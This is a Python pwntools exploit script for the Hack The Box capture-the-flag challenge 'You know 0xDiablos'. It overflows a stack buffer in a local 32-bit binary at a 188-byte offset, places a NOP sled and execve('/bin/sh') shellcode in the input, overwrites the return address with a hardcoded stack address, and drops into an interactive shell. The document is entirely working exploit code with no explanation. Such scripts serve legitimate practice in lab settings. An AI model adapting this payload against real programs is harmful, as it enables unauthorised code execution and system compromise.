from pwn import *

filename = "/root/Escritorio/BOF/TryHarder/X4v1l0k/HTB/You_know_0xDiablos/vuln"

#e = ELF(filename)
context.update(arch='i386')
#context.log_level = 'DEBUG'

p = process(filename)

p.recvline()

offset = 188

eip = p32(0xffffcff0)

post_shellcode = "\x90" * 8

shellcode = asm(shellcraft.execve('/bin/sh'))

pre_shellcode = "\x90" * (offset - len(shellcode) - len(post_shellcode))

payload = pre_shellcode + shellcode + post_shellcode + eip

p.sendline(payload)

p.interactive()